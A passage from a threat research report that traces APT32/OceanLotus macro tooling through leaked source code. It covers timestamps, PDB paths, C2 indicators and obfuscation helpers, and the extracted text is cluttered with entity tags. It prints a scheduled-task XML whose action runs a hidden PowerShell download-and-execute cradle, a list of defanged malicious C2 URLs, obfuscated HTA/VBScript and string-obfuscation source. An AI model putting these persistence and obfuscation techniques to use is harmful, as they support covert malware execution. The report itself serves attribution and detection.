timestampMacros_Builder\\Macros_Builder\\MacrosSource.txt140573/10/2016 23:40:00Macros_Builder\\Macros_Builder\\bin\\Debug\\MacrosSource.txt182197/19/2016 21:34:00Using Visual Studio Code \u2019s built - in comparison capability , we can highlight the line - by - line differences in these two files . The most notable difference is that the more recently modified [ORG] MacrosSource.txt has adjustments to SpawnBase63 procedure to include incorporating an XML scheduled task for persistence and execution of the remote download . This change was made partially because the Macros_Builder program has a modified add_schedule_vba.txt , which is the source for the macro content . It seems as though the developer ran the debug build of this program with input to the [ORG] GUI , leaving us some juicy network toolmarks of a C2 server that may have been used during testing . How exciting!We know . But hold your horses ; we will dive into these details soon.3604/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTThere are also [CARDINAL] two copies of add_schedule_vba.txt , [CARDINAL] one of which is in an older zip archive of the Macros_Builder project . The only change in this file was the addition of additional quotation marks in the [ORG] XMLStr macro arguments for the [ORG] PowerShell download . Development was obviously in progress . Path in P17028    [FAC] StrikeSuit [FAC] Gift    [ORG] Office [ORG] Macro [ORG] Type [ORG] 1\\Reference\\SizeModified timeMacros_Builder.zip\\Macros_Builder\\Resources\\add_schedule_v ba.txt181159/08/2016 03:44:00Macros_Builder\\Macros_Builder\\Resources\\add_schedule_vba.t xt181338/17/2017 21:23:003704/2022The origin story of APT32 macros THREAT RESEARCH REPORTBorrowed and repurposed open - source code The last piece of assessing the totality of this source code was to look at the various solutions , projects , and components , and then think about which pieces were borrowed or \u201c liberated \u201d from open source code projects . While this may not shed light on the future of the malware projects we see here , understanding the use of public code speaks to the developers ' inspiration . FilesNotesVB / ShellcodeLoader/- [NORP] ShellcodeLoader.vbThese pieces contain age - old macro content with variable names originally generated by scriptjunkie and used in a [DATE] 2012 blog post . CSharp / VbaCodeCreator- vba_code_builder.txtMacros_Builder- add_schedule_vba.txtThis exact code , with randomized variables [PERSON] Zopqv [PERSON] Hyeyhafxp [PERSON] Xlbufvetp , etc . , are used verbatim across many derivative projects ( rather than generating original VB code from MSF . So , it may not be directly sourced from this blog , but it is clear that the code was not generated using meterpreter by the developer . It obviously was copypasta\u2019d from somewhere around the internet.Vba_code_builder.txt uses the same VBA7 top block with variables [PERSON] Zopqv [PERSON] Dkhnszol and so forth but then uses some variables to replace with shellcode substitutions . These are later replaced in Core.csBase64Encode2 and other functions taken directly from this text file . Types STARTUPINFO and SECURITY_ATTRIBUTES and more could have been taken directly from ancient VB samples like this one.3804/2022The origin story of APT32 macros THREAT RESEARCH REPORTWebBuilder / [ORG] HtaDotNet- HtaDotnet.csWebBuilder / [ORG] ShellcodeLoader /Test- Program.csMacros_Builder/- _ Cleanup.batThese pieces contain several function names originally seen in [PERSON] James Forshaw [PERSON] \u2019s DotNetToJScript , such as Deserialize_2 BuildLoaderDelegate , etc . ( here and here).This cleanup script does not have much public presence , or at least not much that is easily searchable . But in [DATE] February [DATE] 2021 , a very similar script showed up on Github.3904/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTChapter V4004/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTStockpiling the unique toolmarks and indicators If you \u2019ve made it this far in the story , you are desperately aching to see connections to APT32 . But do n't rush this ! Let the suspense wash over you and enjoy this moment . This is the job , and we \u2019re taking our sweet time with it . Before we hit you with the attribution angles , let [NORP] \u2019s reassess the surface area of all this data and bubble up the unique values that could be helpful in searching for connections . To get us started , we searched through all of the files , source code , notes , and compiled builds , and extracted toolmarks , names , file paths , [ORG] IP addresses , [PERSON] GUIDs , timestamps , and other dirty developer fingerprints . Usernames , handles , and hostnames We extracted a variety of usernames and handles from the various files . It is clear that there are a couple of players at work here , though we do not get much information beyond simple names and a default [PERSON] Windows [PERSON] hostname.NamestoxicRachaelArnoldNotesReadMe.txt , with open date of [CARDINAL] 2017 08 11From [ORG] PDB paths and test paths inside source codeAuthor name in test.doc created [CARDINAL] 2017:08:25 08:30:00WIN [CARDINAL] - FF211E5QDM2\\RachaelEmbedded in [GPE] XmlStr.txt after [NORP] Rachael executed XmlScriptAnalyst.exeDistinct macro timestamps from a scheduled task XML file [CARDINAL] Seven digit decimals in a timestamp One oddly notable project in the [PRODUCT] StrikeSuit [PRODUCT] Gift package is XmlStrAnalyst , which seems to be a test for building or modifying XML scheduled tasks . It uses VB code to write to an outfile [GPE] XmlStr.txt . Looking at the top of the [LOC] XmlStr.txt document , we see it is indeed raw XML for a [PRODUCT] Windows scheduled task . What stands out immediately are unique timestamps that speak to the potential age of the original malware development.4104/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORT<?xml [ORG] version=\"1.0 \" encoding=\"UTF-16 \" ? > < Task version=\"1.2 \" xmlns=\"url \" > < RegistrationInfo><Date>2016 - 06 - 02T11:13:39.1668838</Date > < Author > WIN - FF211E5QDM2\\Rachael</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval > PTBBBPOWERBBBM</Interval > < StopAtDurationEnd > false</StopAtDurationEnd></Repetition><StartBoundary>2016 - 06 - 02T11:12:49.4495965</StartBoundary > < Enabled > true</Enabled></TimeTrigger></Triggers > These hard - coded timestamps are observed in both Macros_Builder \u2019s add_schedule_vba.txt and [ORG] XmlScriptAnalyst [ORG] \u2019s Module1.vb . They are subsequently written into [LOC] MacrosSource.txt and [GPE] XmlStr.txt when [NORP] Macros_Builder.exe or [LANGUAGE] XmlScriptAnalyst.exe are executed , respectively . It may be worthwhile to note that these are unique timestamps , and at [ORDINAL] first glance , it seems odd that the timestamps have [CARDINAL] seven digits of precision after the [TIME] seconds value . With [CARDINAL] seven digits , we know it \u2019s not milliseconds , it 's not microseconds , it \u2019s not nanoseconds . So how exactly did these [CARDINAL] seven - digit timestamps get made , anyway ? We presume it has to be created by Windows , somehow . \u25cf 2016 - 06 - 02T11:13:39.1668838 \u25cf 2016 - 06 - 02T11:12:49.4495965Testing the export of scheduled tasks XML The simplest explanation for the timestamps above is that before this was put into any VB script or [PERSON] Visual [PERSON] Studio solution , the malware developer created and exported an XML scheduled task using [PRODUCT] the [PRODUCT] Windows [PRODUCT] Task [PRODUCT] Scheduler . They used that as a template for the Macros_Builder and [ORG] XmlScriptAnalyst projects . To test this theory , we jump into a VM and try to recreate how a malware author might create and export the Scheduled Task XML . Step [CARDINAL] 1   Using [PRODUCT] the [PRODUCT] Windows [PRODUCT] Task [PRODUCT] Scheduler , we create a test task.4204/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep [CARDINAL] 2   We create a trigger to initiate the task once , and then we select the repeat task [TIME] every [TIME] one [TIME] hour and set the duration to Indefinitely . Note that the start time we select here will be 2022 03 02 at [CARDINAL] 8 [CARDINAL] 41 05AM   EST in our [GPE] Virtual Machine).4304/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep [CARDINAL] 3   We create an action for the task to run rundll32.exe with arguments to execute a VB scriptlet . Step [CARDINAL] 4   We finalize [FAC] the [FAC] Scheduled [FAC] Task , then right - click the task entry and export to an XML file.4404/2022The origin story of APT32 macros THREAT RESEARCH REPORTStep [CARDINAL] 5   We view the exported scheduled task XML and see that it indeed contains the date timestamps with [CARDINAL] seven points of decimal precision . Further , we see that [PRODUCT] the [PRODUCT] Task [PRODUCT] Scheduler embeds the author computer name and username in our test file . We confirm that the RegistrationInfo Date timestamp is when we created the task , and the Trigger StartBoundary timestamp is when our task is set to begin . What a joyous day.<?xml version=\"1.0 \" encoding=\"UTF-16 \" ? > < Task version=\"1.2 \" xmlns=\"url\"><RegistrationInfo><Date>2022 - 03 - 02T08:43:01.7591912</Date > < Author > user - PC\\user</Author></RegistrationInfo > < Triggers><TimeTrigger><Repetition><Interval > PT1H</Interval > < StopAtDurationEnd > false</StopAtDurationEnd></Repetition > < StartBoundary>2022 - 03 - 02T08:41:05.5580189</StartBoundary > < Enabled > true</Enabled></TimeTrigger></Triggers>4504/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORT < Principals><Principal id=\"Author\"><UserId > user - PC\\user</UserId > < LogonType > InteractiveToken</LogonType > < RunLevel > LeastPrivilege</RunLevel></Principal></Principals > < Settings><MultipleInstancesPolicy > IgnoreNew</MultipleInstancesPolicy > < DisallowStartIfOnBatteries > true</DisallowStartIfOnBatteries > < StopIfGoingOnBatteries > true</StopIfGoingOnBatteries > < AllowHardTerminate > true</AllowHardTerminate > < StartWhenAvailable > false</StartWhenAvailable > < RunOnlyIfNetworkAvailable > false</RunOnlyIfNetworkAvailable > < IdleSettings><StopOnIdleEnd > true</StopOnIdleEnd > < RestartOnIdle > false</RestartOnIdle></IdleSettings > < AllowStartOnDemand > true</AllowStartOnDemand > < Enabled > true</Enabled > < Hidden > false</Hidden > < RunOnlyIfIdle > false</RunOnlyIfIdle > < WakeToRun > false</WakeToRun > < ExecutionTimeLimit > P3D</ExecutionTimeLimit > < Priority>7</Priority></Settings > < Actions Context=\"Author\"><Exec><Command > rundll32.exe</Command > < Arguments > mshta vbscript : Execute(\"CreateObject(\"WScript . Shell\").Run\"powershell.exe -nop -whidden -c \" \" [ORG] IEX ( ( new - object net.webclient).downloadstring('url \" \" \" , [CARDINAL] 0 : code close\")</Arguments></Exec></Actions></Task > The XML for a Scheduled Task is not generated unless you export it , so we can guess that Windows is storing the information used to create the XML somewhere in the registry . Using regedit.exe , we pull up HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\ to browse around Tasks keys . We see that there is a registry key for our Time Test Task , where the [PRODUCT] DynamicInfo key stores what is likely to be our StartBoundary timestamp.4604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThis value [CARDINAL] 1E7B9C6F3B2ED801 is a Windows FILETIME , a [CARDINAL] 64 - bit structure containing the number of [CARDINAL] 100 - nanosecond intervals since [DATE] Jan [DATE] 1 , [DATE] 1601 . Using [ORG] CyberChef , we can convert [CARDINAL] 1E7B9C6F3B2ED801 to a more human - readable format using the Windows FILETIME to UNIX Timestamp operation , which confirms this hex value is [DATE] 2022 [DATE] - [DATE] 03 [DATE] - 02 at 13:43:01 [ORG] UTC ( or [TIME] 8 [TIME] 43 [TIME] AM [TIME] EST . In Windows , w32tm.exe takes [CARDINAL] 10^ 7s   [CARDINAL] 100 nanoseconds ) intervals and converts to a readable format . The value [CARDINAL] 1E7B9C6F3B2ED801 in Int64 is [DATE] 132907021817903902 . Passing that value into w32tm.exe gives us this : C:\\Users\\user\\Desktop > w32tm.exe /ntte [DATE] 132907021817903902 153827 13:43:01.7903902 - 3/2/2022 1:43:01 PMOf course , after doing all of that , we find out there is an easier way . We can pass the byte flipped hex of the original value : C:\\Users\\user\\Desktop > w32tm.exe /ntte 0x01D82E3B6F9C7B1E [CARDINAL] 153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM4704/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTWell , we can see that w32tm.exe presents this timestamp to us just like we expected and with the expected [CARDINAL] seven digits of precision . However , it is unclear how or why the last [CARDINAL] 7 digits differ from what we see in our XML timestamp . Naturally , as with all things in digital forensics , you have to know what your tools are doing behind the scenes to understand if they are summarizing or truncating numbers and to what degree of specificity , let alone the correct time offset . [ORG] Timestamps , amirite?Developer fingerprints in scheduled task XML When we switch back to looking at [GPE] XmlStr.txt , we see that this XML contains the original malware developer \u2019s computer name , user name , and timestamps that likely indicate the approximate date on the development system when the XML script content was originally created , around the time it was used to create macros in the [DATE] 2016 version of Macros_Builder.<?xml [PRODUCT] version=\"1.0 \" encoding=\"UTF-16 \" ? > < Task version=\"1.2 \" xmlns=\"url \" > < RegistrationInfo><Date>2016 - 06 - 02T11:13:39.1668838</Date > < Author > WIN - FF211E5QDM2\\Rachael</Author></RegistrationInfo><Triggers><TimeTrigger><Repetition><Interval > PTBBBPOWERBBBM</Interval > < StopAtDurationEnd > false</StopAtDurationEnd></Repetition><StartBoundary>2016 - 06 - 02T11:12:49.4495965</StartBoundary > < Enabled > true</Enabled></TimeTrigger></Triggers > One final nugget of interest is the interval value [ORG] PTBBBPOWERBBBM . This is a value that was altered from the original exported XML to be a placeholder value that would be changed depending on values entered in the GUI of the Macros_Builder program . Except this value is never referenced . Instead , Macros_Builder Form1.cs checks the macro content to replace the value [PERSON] BBBPOWERBBB . This is [CARDINAL] one of many small errors that shows that the program is obviously undergoing development at the time of interception.4804/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTIf you \u2019re a seasoned Windows forensicator , you \u2019re likely already familiar with Windows timestamp shenanigans , and none of this is new or surprising to you . So why should you care and why does any of this timestamp business matter ? Well , seeing [CARDINAL] seven digits of precision in an XML scheduled task may indicate that it was created and exported by [ORG] the [ORG] Windows [ORG] Task [ORG] Scheduler . This structure of the timestamp can be used for detection purposes to highlight content that was generated with this approach . Network - based indicators The [ORG] MacrosSource.txt file stored output from an execution of the newer debug build of Macros_Builder , leaving us these [ORG] IP addresses that may have been used for the testing of the macro Several of the StrikeSuit Gift projects were compiled in debug mode , leaving us clear paths to the [ORG] PDB symbol files , reflecting information about the original development directories . Though we can not necessarily trust these timestamps to indicate the true original compile time , these paths and timestamps together paint a fuzzy evolutionary timeline from old to new code and capabilities.4904/2022The origin story of APT32 macros THREAT RESEARCH REPORThash.md5pe.timestamppe.pdb_path850b062d81975c43 6dc5d03d4053372f2008 - 09 - 01 18:48:30 ( 1220309310)2009 [CARDINAL] - 05 [CARDINAL] - [CARDINAL] 16 07:47:06 ( 1242474426)2009 [CARDINAL] - 05 [CARDINAL] - [CARDINAL] 16 07:47:14 ( 1242474434)2009 [CARDINAL] - 05 [CARDINAL] - [CARDINAL] 16 07:47:14 ( 1242474434)2009 [CARDINAL] - 05 [CARDINAL] - [CARDINAL] 16 [TIME] 09:44:30 ( 1242481470)2009 [CARDINAL] - 05 [CARDINAL] - [CARDINAL] 16 [CARDINAL] 09:44:31 ( 1242481471)2009 [DATE] - 05 [DATE] - [DATE] 16 09:44:40 ( [CARDINAL] 1242481480)g:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShLdr\\\\obj\\\\Debug\\\\ShLd r.pdbG:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\Test\\\\ obj\\\\Release\\\\Test.pdbG:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\L\\\\obj \\\\Debug\\\\L.pdbG:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\Test\\\\ obj\\\\Debug\\\\Test.pdbg:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\HtaDotnet\\\\o bj\\\\Debug\\\\HtaDotnet.pdbg:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\Test\\\\obj\\\\D ebug\\\\Test.pdbg:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\Test\\\\obj\\\\R elease\\\\Test.pdbce985259ba7a962f 39c48f157e31f5aa2013 [CARDINAL] - [CARDINAL] 10 [CARDINAL] - 08 12:00:51 ( [CARDINAL] 1381248051)d:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [CARDINAL] 1\\\\Source\\\\CSharp\\\\MacrosEmbedding\\\\MacrosEmbedding\\\\ob j\\\\Debug\\\\MacrosEmbedding.pdb1a54a5af55fa7210 f0f6e7b8118661ff2013 - 10 - 08 12:08:52 ( [CARDINAL] 1381248532)d:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\\\Source\\\\CSharp\\\\VbaCodeCreator\\\\VbaCodeCreator\\\\obj\\ \\Debug\\\\VbaCodeCreator.pdbd1c8da885b9f283c f2114e53fee43fe02016 - 01 - 26 04:18:22 ( 1453799902)d:\\\\Source\\\\visual\\\\Embed Office\\\\NtfsStreams\\\\Trinet . Core . IO.Ntfs\\\\obj\\\\Debug\\\\T rinet . Core . IO.Ntfs.pdbfeda9657a3861805 4fe95a07dad545982016 - 03 - 11 04:02:13d:\\\\Source\\\\visual\\\\Embed Office\\\\Office Macros\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Release\\\\M5004/2022The origin story of APT32 macros THREAT RESEARCH REPORT(1457686933)acros_Builder.pdb4bfb1d2889d29936 c72513c9e187937e2016 - 04 - 06 21:18:55 ( 1459991935)d:\\\\Source\\\\visual\\\\VBScript ADS Loader\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debug\\\\Mac ros_Builder.pdbc0ea1573b006ab4b [CARDINAL] 419af0e6b29df5502016 - 07 - 20 00:32:49 ( 1468989169)d:\\\\Source\\\\visual\\\\VBScript ADS Loader\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debug\\\\Mac ros_Builder.pdb8d74fc0ef81b32f7 3c0797ec2a03e6772017 - 08 - 14 00:31:58 ( [CARDINAL] 1502685118)D:\\\\P17028 - [ORG] StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [ORG] 1\\\\Source\\\\CSharp\\\\MacrosEmbeddingExample\\\\MacrosEmbedd ingExample\\\\obj\\\\Debug\\\\MacrosEmbeddingExample.pdbe1a3d0eb585567a6 9eb2a0606b622e102017 - 08 - 17 00:03:09 ( [CARDINAL] 1502942589)D:\\\\P17028 - [ORG] StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\\\Source\\\\VB\\\\XmlScriptAnalyst\\\\XmlScriptAnalyst\\\\obj\\ [CARDINAL] \\Debug\\\\XmlScriptAnalyst.pdbde1e7c29d98778fd 7fbb832bd599b3672017 - 08 - 17 04:18:44 ( 1502957924)d:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [ORG] 1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debu g\\\\Macros_Builder.pdbd4251964e97e7225 8be9cf1acf222bf32017 - 08 - 22 00:18:26 ( [CARDINAL] 1503375506)d:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\L\\\\obj\\\\Debu g\\\\L.pdb0f02cf16b466a7bd 2643ef01e09fc6d02017 - 08 - 22 00:18:30 ( 1503375510)d:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [ORG] 1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\Test\\\\obj\\\\D ebug\\\\Test.pdb84113138ed90ab30 3a4dd1eedc6a6f192017 - 08 - 23 04:44:28 ( [CARDINAL] 1503477868)D:\\\\P17028 - [ORG] StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro Type 1\\\\Source\\\\C_Cpp\\\\Binary\\\\Debug\\\\Binary.pdbe2a9f698cb6aa417 bae41ce02d0555da2017 - 08 - 23 07:01:51 ( [CARDINAL] 1503486111)D:\\\\P17028 - [ORG] StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\\\Source\\\\C_Cpp\\\\ShellcodeThreadCaller\\\\x64\\\\Debug\\\\Sh ellcodeThreadCaller.pdb77374f452700e17f 3fe8c959db3d9f232017 - 08 - 23 07:02:11 ( [CARDINAL] 1503486131)D:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\\\Source\\\\C_Cpp\\\\ShellcodeThreadCaller\\\\Debug\\\\Shellco deThreadCaller.pdb5104/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTThreadwork of attribution and assessing connections to APT32 Finally , after tedious inspection of this messy pile of data , we can take stock of our indicators , TTPs , and other pivots and align the [PRODUCT] StrikeSuit [PRODUCT] Gift package with public reporting of named threat actors . Attribution is a spectrum , of course , and along the axis of specificity there are different burdens of proof required to make an attribution . In our case , because we are assessing alignment with a large cluster that is not necessarily a real - life \u201c group \u201d but more a superset of intrusions that transcend years of activity , a preponderance of evidence will suffice . So , let \u2019s begin with dumping a few of the most qualified data points that show connections to APT32 or [ORG] OceanLotus . ShellcodeLoader L.dll package is the same hash as that which is mentioned in this [ORG] RedDrip [ORG] Team blog about [ORG] OceanLotus . Beyond being simply the same hash , the [PRODUCT] StrikeSuit [PRODUCT] Gift project [ORG] WebBuilder / [ORG] ShellcodeLoader has all the technical hallmarks of being the source code for this loader , so that \u2019s nice and convenient for us . [ORG] ShellcodeLoader project showing [ORG] TypeLib I d GUID , whichis the same as in theL.dll file THREAT RESEARCH REPORTXML timestamps There are more direct and obvious connections to APT32 ( or [ORG] OceanLotus ) in the VB macro and XML scheduled tasks . A quick survey shows that the [CARDINAL] two XML timestamps observed across multiple projects in the [FAC] StrikeSuit [FAC] Gift package   StartBoundary 2016 - 06 - 02T11:12:49.4495965 and Date 2016 - 06 - 02T11:13:39.1668838 ) are seen in the macro content of [CARDINAL] hundreds of malicious documents.5304/2022The origin story of APT32 macros THREAT RESEARCH REPORTMany of these macros designate remote network resources attributed to APT32 , [ORG] OceanLotus , [ORG] Cobalt [ORG] Kitty , and so forth . Sample files containing StartBoundary and Date timestamps2016 - 06 - 02T11:12:49.4495965 and [DATE] 2016 [DATE] - 06 [DATE] - 02T11:13:39.1668838 , revealing many overlapswith APT32 and [ORG] OceanLotus infrastructure . File MD5Example C2 address from macroC2 attribution33adc53121634127 picr.jpgAPT32   Mandiant)e334b21a2c52dcf8 a46990b47dfb4726http[:]//contay.deaftone.com / user / upload / i mg / icon.gif?n=%COMPUTERNAME%APT32   [ORG] Mandiant)e47554108ef02e9c dc3a034fea1cb943http[:]//job.supperpow.com:80 / pd / random1 / r andpic/1.jpgAPT32   Mandiant)f87bab14791c3230 b43241500870b109\\\"h\\\"t\\\"t\\\"p://icon.torrentart.com:80/789 . jpgAPT32   Mandiant)b7ee7947f9f01790 7f6a175da10a6bf0http[:]//chinanetworkvub.info:80 / global / as 15daa274ec269bbehttp[:]//update - flashs.com / gpixel.jpgAPT32   Mandiant)http[:]//google - script.com / adobereg.binCobalt [PERSON] Kitty   CyberReason)e48cc615a4569175 b2ea144928d5b871http[:]//support.chatconnecting.com:80 / pub lic / public_pics / rpic.jpgOceanLotus ( blevene ) Cobalt Kitty   CyberReason)ObfuscationHelper.csTaking a step beyond the comfortable immediacy of indicator links , we can take a gander at TTPs associated with [ORG] StrikeSuit [ORG] Gift and APT32 such as obfuscation methods . [CARDINAL] One of the interesting components of the [PRODUCT] StrikeSuit [PRODUCT] Gift package is a piece of source code smartly named [ORG] ObfuscationHelper . Within the [ORG] HtaDotnet package , the ObfuscationHelper.cs code does exactly what it sounds like it does , and has a bunch of functions to help provide jacked up strings when building [ORG] HTA files with obfuscated macros . There are many layers to this onion . The [ORG] ObfuscationHelper , though , uses arrays of vowels and consonants to build random strings with random casings that appear to be like words . For example , we can use the [ORG] HtaDotnet project to build an [ORG] HTA file and we might get code that looks something like this : Snippets of code extracted from a fabricated testHtaDotnet output .hta file.<HTA : APPLICATION iD=\"KONG \" iCON= \" # \" wINDOwstATE='mINiMize ' sHOwINtAskbAR='No ' / > < script language=\"vbscript \" > on ERror reSume [ORG] Next [ORG] HetGhonCosWewShiw=\"ZXUWgQaHQl0qUbK9YHZROhNYn0jYAAEAAAD AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdG VTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZ\"5504/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTJepZacWimQuungGhun=\"h6m1P3lqH0iwiS0xNaK , wUxEnHR2umtUEJmSvy , fHWQKsadnNWMoLi,4T83Ud8uQOLnzcSqqWAmta [CARDINAL] 9p5DAABAAAA wEAAAAAAAAABAEAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdG UHdGFyZ2V0MAdtZXRob2 \" \u2026 ( [CARDINAL] truncated)FunctIoN [PERSON] QuudKisWhaw ( WhacThes)QuisVesGupYewFong = [ORG] WhacThes QuisVesGupYewFong = [ORG] ReplAce ( QuisVesGupYewFong , \" \" , \" = \" ) QuisVesGupYewFong= replACE ( QuisVesGupYewFong , \" . \" , \" / \" ) QuisVesGupYewFong = replAce ( QuisVesGupYewFong , \" , \" , \" + \" ) QuudKisWhaw= QuisVesGupYewFongENd FunCtIOn \u2026 (truncated)fuNCtIOn [ORG] WhosChem ( YowDon , GongWiwFangLip , GidRomShos , [ORG] CiwHap , KepChinGhop , GinChongYiwQuis)oN eRroR reSume NExTSet [ORG] ShepWhud = COpquiwwHEnleT ( \" [WORK_OF_ART] WScript . Shell \" ) [ORG] ShepWhud . RegRead \" [PERSON] HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\\"+ [PERSON] YowDon+ \" \\\" \u2026 An analyst looking at just the [ORG] HTA file might be quick to hone in on a couple of unique values such as < [ORG] HTA : APPLICATION iD=\"KONG \" , but we can see in our source code that the value [GPE] KONG is actually generated by the [ORG] ObfuscationHelper . Code to create the randomized [ORG] HTA header usingObfuscationHelperhtaAttr = [ORG] ObfuscationHelper . RandomLowerUpperCase(\"ID=\\ \" \" + obs . RandomWords ( ) + \" \\ \" icon=\\\"#\\ \" />\");The special sauce of [ORG] ObfuscationHelper begins with [CARDINAL] three string arrays for vowels and consonants that are later used to build words , which are later checked against a list of special , reserved keywords for the VB macro . We notice that in CONSONANTS_1 there are a couple of duplicates , perhaps a copy / paste error . The vowels will be familiar to most , but how and why are these consonants selected?5604/2022The origin story of APT32 macros THREAT RESEARCH REPORTOn speculation , we may guess that these consonants ( and digraph phonemes , representing small pieces of sound in speech ) were selected to help fabricate fake strings that appear to be read like or sound like real language words . The selection of vowels and consonants allows the generation of strings with the right construction , though that is highly dependent on the language . For example , when considered phonetically , modern [LANGUAGE] English commonly uses the phoneme \u00f0 ( digraph \u201c th \u201d ) , whereas the phoneme \u0263 ( digraph \u201c gh \u201d ) is not present . So what does this exact array of consonants imply , and did the developer premeditate the consonants to appear like a particular language ? If so , which one ? Would [NORP] Vietnamese be a baseless guess ? Or maybe it 's random copypasta ? Maybe we will never know . ObfuscationHelper declaring the string arraysprivate static readonly string [ ] VOWELS = new string [ ] { \" a \" , \" e \" , \" i \" , \" o \" , \" u \" } ; private static readonly string [ ] CONSONANTS_1 = new string [ ] { \" b \" , \" c \" , \" d \" , \" f \" , \" g \" , \" h \" , \" j \" , \" k \" , \" l \" , \" ch \" , \" gh \" , \" qu \" , \" sh \" , \" th \" , \" wh \" , \" m \" , \" n \" , \" p \" , \" q \" , \" r \" , \" s \" , \" t \" , \" v \" , \" w \" , \" x \" , \" y \" , \" z \" , \" ch \" , \" gh \" , \" qu \" , \" sh \" , \" th \" , \" wh \" } ; private static readonly string [ ] CONSONANTS_2 = new string [ ] { \" c \" , \" d \" , \" m \" , \" n \" , \" p \" , \" ng \" , \" s \" , \" t \" , \" w \" , \" ng \" } ; Cloning new arrays forObfuscationHelper()public [ORG] ObfuscationHelper ( ) { this.m_vowels = CloneStringArray(VOWELS ) ; this.m_consonants_1 = CloneStringArray(CONSONANTS_1 ) ; [CARDINAL] this.m_consonants_2 = CloneStringArray(CONSONANTS_2);}Example of a function using the consonant and vowel arrays to build a randomized word.public string RandomSingleWord(bool autoUpper ) { [GPE] URandom rand = new [ORG] URandom ( ) ; int idx1 = rand . Next(0 , this.m_consonants_1.Length ) ; int idx2 = rand . Next(0 , this.m_vowels . Length ) ; int idx3 = rand . Next(0 , this.m_consonants_2.Length);string s = this.m_consonants_1[idx1 ] ; if ( autoUpper ) { 5704/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORTstring u = s. Substring(0 , [CARDINAL] 1).ToUpper ( ) ; s = u + s. Substring(1 ) ; } s + = this.m_vowels[idx2 ] ; s + = this.m_consonants_2[idx3 ] ; return s;}The reason this [ORG] ObfuscationHelper is pertinent to the discussion is that APT32 / OceanLotus clusters are famous for similar obfuscation and encoding , and they are likely using similar techniques still [DATE] today . In [DATE] 2018 , ESET detailed a piece of malware with a library [ORG] HTTPprov designed to aid in string generation while ( buff < buffEnd){b = genRand(16 ) ; if ( b[0 ] - 0x50 > 0x50)t=0;else*buf++= UPPER(vowels[b[1 ] % 5]);v = consonants[b[1]%21 ] ) ; if ( ! t)v = UPPER(v);*buff++= v ; if ( v!=\u2019h \u2019 & & b[2 ] - 0x50 < 0x50)*buff++= \u2018 h \u2019 ; * buff++= vowels[b[4 ] % 5];if ( b[5 ] < 0x60)*buff++= vowels[b[6 ] % [CARDINAL] 5 ] ; * buff++= consonants[b[7 ] % 21];if ( b[8 ] < 0x50)*buff++= vowels[b[9 ] % [CARDINAL] 5 ] ; * buff++= \u2018 - \u2019 ; } ; * buff=\u2019\\0\u2019;In the [DATE] 2019 [ORG] OceanLotus report by [ORG] RedDrip [ORG] Team , we see this [ORG] HTA file feel as our [ORG] HTA test file generated with [ORG] Obfuscation [ORG] Helper . This is not surprising , because our5804/2022The origin story of APT32 macros THREAT RESEARCH REPORTShellcodeLoader shows along with this attack as well , but it \u2019s still nice to see all of these tools < script language=\"vbscript \" > on erROR RESUMe NexT \u2026 [ORG] FUNctIon [PRODUCT] QuangGhut ( [ORG] BongHim ) set [ORG] QuangGhut= [ORG] CreAteobjECT ( [ORG] BongHim ) enD [ORG] FUnCtIon \u2026 [FAC] FuNCtiOn [FAC] NingGhac(ThepGhotChudVong , [ORG] HengThew , [ORG] ChedBom , [GPE] PitWhiwVeng ) [PERSON] SeT [PERSON] DapVen = [CARDINAL] qUAnggHUt ( 